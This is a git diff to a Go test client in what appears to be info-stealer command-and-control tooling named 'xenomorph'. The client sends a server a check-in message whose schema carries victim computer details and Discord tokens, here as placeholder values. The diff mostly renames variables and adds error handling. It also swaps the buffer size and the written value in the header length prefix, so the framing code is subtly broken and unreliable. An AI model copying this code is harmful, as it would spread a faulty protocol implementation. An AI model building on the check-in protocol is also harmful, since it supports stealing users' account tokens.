@@ -8,6 +8,10 @@ import (
 	"github.com/codevault-llc/xenomorph/internal/common"
 )
 
+const (
+	headerSizeLen = 4
+)
+
 type ConnectionData struct {
 	ComputerName    string `json:"computer_name"`
 	ComputerOS      string `json:"computer_os"`
@@ -40,7 +44,7 @@ func main() {
 	}
 	defer conn.Close()
 
-	testJson := ConnectionData{
+	testJSON := ConnectionData{
 		ComputerName:    "TestComputer",
 		ComputerOS:      "Windows",
 		ComputerVersion: "10",
@@ -61,7 +65,7 @@ func main() {
 		DiscordTokens:   "token1, token2",
 	}
 
-	jsonData, err := json.Marshal(testJson)
+	jsonData, err := json.Marshal(testJSON)
 	if err != nil {
 		panic(err)
 	}
@@ -71,31 +75,39 @@ func main() {
 		TotalSize: len(jsonData),
 	}
 
-	headerJson, err := json.Marshal(headerData)
+	headerJSON, err := json.Marshal(headerData)
 	if err != nil {
 		panic(err)
 	}
 
-	rawJsonData := json.RawMessage(jsonData)
+	rawJSONData := json.RawMessage(jsonData)
 	message := &common.Message{
 		Type:     common.MessageTypeConnection,
-		JsonData: &rawJsonData,
+		JSONData: &rawJSONData,
 	}
 
-	headerSize := uint32(len(headerJson))
-	headerSizeBuf := make([]byte, 4)
-	binary.BigEndian.PutUint32(headerSizeBuf, headerSize)
+	headerSize := uint32(len(headerJSON))
+	headerSizeBuf := make([]byte, headerSize)
+	binary.BigEndian.PutUint32(headerSizeBuf, headerSizeLen)
+
 	if _, err := conn.Write(headerSizeBuf); err != nil {
 		panic(err)
 	}
 
-	conn.Write(headerJson)
+	if _, err := conn.Write(headerJSON); err != nil {
+		panic(err)
+	}
 
-	messageJson, err := json.Marshal(message)
+	messageJSON, err := json.Marshal(message)
 	if err != nil {
 		panic(err)
 	}
 
-	conn.Write(messageJson)
-	conn.Write([]byte("END_OF_MESSAGE"))
+	if _, err := conn.Write(messageJSON); err != nil {
+		panic(err)
+	}
+
+	if _, err := conn.Write([]byte("END_OF_MESSAGE")); err != nil {
+		panic(err)
+	}
 }
